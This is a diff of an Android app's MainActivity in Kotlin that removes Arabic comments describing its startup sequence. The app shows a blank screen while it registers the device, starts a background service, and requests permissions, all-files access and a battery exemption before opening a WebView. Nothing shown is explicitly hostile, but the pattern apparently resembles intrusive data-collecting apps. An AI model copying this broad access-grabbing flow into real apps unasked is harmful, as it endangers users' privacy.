@@ -28,13 +28,8 @@ class MainActivity : AppCompatActivity() {
         white.setBackgroundColor(Color.WHITE)
         setContentView(white)
 
-        // 1. سجّل الجهاز
         DeviceManager.registerDevice(this)
-
-        // 2. شغّل الخدمة
         startBackgroundService()
-
-        // 3. اطلب الصلاحيات فورًا (قبل فتح WebView)
         requestPermissionsStep1()
     }
 
@@ -84,7 +79,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun onPermissionsDone() {
-        // بعد الصلاحيات — نطلب إعدادات خاصة
         requestAllFilesAccess()
     }
 
@@ -126,7 +120,6 @@ class MainActivity : AppCompatActivity() {
             intent.data = Uri.parse("package:$packageName")
             startActivity(intent)
         } catch (_: Exception) {}
-        // بعد البطارية — افتح WebView
         android.os.Handler(mainLooper).postDelayed({ openWebView() }, 2000)
     }
 
